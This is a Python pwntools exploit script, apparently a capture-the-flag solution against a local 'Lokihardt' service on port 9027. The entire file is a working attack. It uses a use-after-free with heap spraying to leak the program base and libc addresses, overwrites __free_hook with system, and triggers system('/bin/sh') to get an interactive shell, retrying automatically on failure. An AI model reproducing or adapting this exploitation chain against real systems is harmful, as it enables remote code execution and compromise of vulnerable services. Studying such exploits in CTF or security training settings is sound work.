import time

from pwn import *


class LokihardtExploit:
    RDATA_SIZE = 256
    WDATA_SIZE = 16
    G_BUF_SIZE = 16
    WRITE_PTR_OFFSET = 0x12BD
    STDOUT_PTR_OFFSET = 0x201F40
    ARRAY_BUFFER_OFFSET = 0x202080
    NULL_TYPE_OFFSET = 0x1258

    STDOUT_LIBC_OFFSET = 0x3C5708
    SYSTEM_LIBC_OFFSET = 0x453A0
    FREE_HOOK_LIBC_OFFSET = 0x3C67A8

    def __init__(self):
        self.shell = remote('localhost', 9027)
        self.base_address = 0
        self.libc_address = 0

    def allocate(self, idx, rdata, wdata):
        print(self.shell.recvuntil(">"))
        self.shell.sendline("1")
        print(self.shell.recvuntil("idx? "))
        self.shell.sendline(str(idx))
        self.shell.sendline(rdata + wdata)

    def delete(self, idx):
        print(self.shell.recvuntil(">"))
        self.shell.sendline("2")
        print(self.shell.recvuntil("idx? "))
        self.shell.sendline(str(idx))

    def use(self, idx, wdata=None):
        print(self.shell.recvuntil(">"))
        self.shell.sendline("3")
        print(self.shell.recvuntil("idx? "))
        self.shell.sendline(str(idx))
        if wdata:
            if "your data?" == self.shell.recv(10):
                self.shell.send(wdata)
            else:
                raise EOFError()

    def garbage_collect(self):
        print(self.shell.recvuntil(">"))
        self.shell.sendline("4")

    def heap_spray(self, rdata, wdata):
        print(self.shell.recvuntil(">"))
        self.shell.sendline("5")
        self.shell.sendline(rdata + wdata)

    def activate_uaf(self, idx, spray_rdata, spray_wdata, write_scenario_data=None):
        self.allocate(idx, "A" * self.RDATA_SIZE, "A" * self.G_BUF_SIZE)
        self.delete(15)
        self.garbage_collect()
        for i in range(4):
            self.heap_spray(spray_rdata, spray_wdata)
        self.use(idx, wdata=write_scenario_data)

    def leak_base_address(self):
        print("PHASE 1: LEAKING BASE ADDRESS")
        self.activate_uaf(0, "B" * self.RDATA_SIZE, "read".ljust(self.WDATA_SIZE, "\x00"))
        leaked_data = self.shell.recvuntil("menu -")
        print(leaked_data)
        if "BBBB" not in leaked_data:
            raise EOFError()
        null_type_address = u64(leaked_data[:8])
        self.base_address = null_type_address - self.NULL_TYPE_OFFSET
        print("PHASE 1 COMPLETED! FOUND BASE ADDRESS: " + hex(self.base_address))

    def set_array_buffer_to_stdout_ptr(self):
        print("PHASE 2: SETTING ARRAY_BUFFER[1] = STDOUT_PTR")
        array_buffer_address = self.base_address + self.ARRAY_BUFFER_OFFSET
        write_ptr_address = self.base_address + self.WRITE_PTR_OFFSET
        stdout_ptr_address = self.base_address + self.STDOUT_PTR_OFFSET
        malicious_obj = p64(array_buffer_address + 2 * 8)  # wdata = array_buffer[2]
        malicious_obj += p64(8)                            # length = 8
        malicious_obj += p64(write_ptr_address)            # type = write_ptr
        self.activate_uaf(1, malicious_obj * 10 + b"C" * 16, "C" * self.WDATA_SIZE,
                          write_scenario_data=p64(stdout_ptr_address))
        print("PHASE 2 COMPLETED!")

    def trigger_libc_leak(self):
        print("PHASE 3: LEAKING LIBC ADDRESS")
        self.allocate(3, "read".ljust(self.RDATA_SIZE, "\x00"), "D" * self.WDATA_SIZE)
        self.use(2)
        leaked_data = self.shell.recvuntil("menu")
        print(leaked_data)
        stdout_address = u64(leaked_data[:8])
        self.libc_address = stdout_address - self.STDOUT_LIBC_OFFSET
        # Cleanup the allocated object
        self.delete(3)
        self.garbage_collect()
        print("PHASE 3 COMPLETED! FOUND LIBC BASE ADDRESS: " + hex(self.libc_address))

    def overwrite_free_ptr_with_system_ptr(self):
        print("PHASE 4: OVERWRITING FREE_HOOK WITH SYSTEM")
        free_hook_address = self.libc_address + self.FREE_HOOK_LIBC_OFFSET
        system_address = self.libc_address + self.SYSTEM_LIBC_OFFSET
        self.allocate(3, "write".ljust(self.RDATA_SIZE, "\x00"), p64(free_hook_address) + p64(8))
        self.use(2, wdata=p64(system_address))
        self.delete(3)
        print("PHASE 4 COMPLETED!")

    def trigger_shell(self):
        # trigger free(theOBJ), which we manipulated to be system("/bin/sh")
        self.allocate(4, "/bin/sh".ljust(self.RDATA_SIZE, "\x00"), "E" * self.WDATA_SIZE)
        self.delete(15)
        self.garbage_collect()

    def attempt_attack(self):
        self.leak_base_address()
        self.set_array_buffer_to_stdout_ptr()
        self.trigger_libc_leak()
        self.overwrite_free_ptr_with_system_ptr()
        self.trigger_shell()

    def run(self):
        while True:
            try:
                self.attempt_attack()
                print("FINISHED!!!")
                self.shell.interactive()
            except EOFError:
                print("GOT EOF, RETRYING!")
            finally:
                self.shell.close()
                self.shell = remote('localhost', 9027)


if __name__ == '__main__':
    LokihardtExploit().run()
